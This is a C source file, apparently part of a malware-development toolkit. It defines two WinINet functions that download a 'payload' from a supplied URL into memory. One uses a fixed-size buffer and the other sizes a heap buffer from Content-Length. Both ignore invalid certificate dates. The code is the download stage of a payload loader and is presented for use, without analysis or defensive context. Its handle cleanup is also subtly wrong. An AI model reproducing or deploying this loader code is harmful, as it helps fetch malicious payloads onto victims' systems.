#include "WebRetrival.h"

BOOL FetchPayloadHttpStatic(LPWSTR pURL,USHORT sPayload, PVOID pPayload)
{
	
	DWORD dwBytesWritten;
	BOOL state = FALSE;
	HINTERNET hInetSession, hInetFile = NULL;
	
	if (!(hInetSession = InternetOpenW(NULL, 0, NULL, NULL, 0))) goto  _cleanUp;

	if (!(hInetFile = InternetOpenUrlW(
		hInetSession, pURL,
		NULL, 0,
		INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0
	))) goto _cleanUp;

	if (!(InternetReadFile(hInetFile, pPayload, sPayload, &dwBytesWritten))) goto _cleanUp;

	state = TRUE;

_cleanUp:	
	if (!hInetSession) return state;
	
	InternetCloseHandle(hInetSession);
	
	if (!hInetFile) return state;
	
	InternetCloseHandle(hInetFile);

	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);

	return state;
}



BOOL FetchPayloadHttpDynamic(LPWSTR pURL, PBYTE* pPayload, PSIZE_T psPayload)
{
	HINTERNET hInet, hFileInet = NULL;
	DWORD dwBytesRead = 0;
	DWORD sPayloadSize = 0;
	DWORD dwSizeOfPayloadSize = sizeof(sPayloadSize);
	BOOL state = FALSE;
	SIZE_T sTracker = 0;
	
	if (!(hInet = InternetOpenW(NULL, 0, NULL, NULL, 0))) goto _cleanup;

	if (!(hFileInet = InternetOpenUrlW(
		hInet, pURL, NULL, 0, 
		INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0
	))) goto _cleanup;

	if (!HttpQueryInfoW(hFileInet, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &sPayloadSize, &dwSizeOfPayloadSize, NULL)) goto _cleanup;

	if (!sPayloadSize) goto _cleanup;

	*psPayload = sPayloadSize;

	if (!(*pPayload = LocalAlloc(LPTR, sPayloadSize))) goto _cleanup;
	
	while (sPayloadSize > sTracker) {
		if (InternetReadFile(hFileInet, *pPayload + sTracker, sPayloadSize - sTracker, &dwBytesRead))
		{
			if (dwBytesRead == 0) break;
			sTracker += dwBytesRead;
		}
		else goto _cleanup; 
	}
	if (sTracker == sPayloadSize) state = TRUE;
	
_cleanup:
	if (!hInet) goto _EndOfFunc;
	InternetCloseHandle(hInet);
	
	if (!hFileInet) goto _EndOfFunc;
	InternetCloseHandle(hFileInet);
	
_EndOfFunc:
	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	
	return state;
}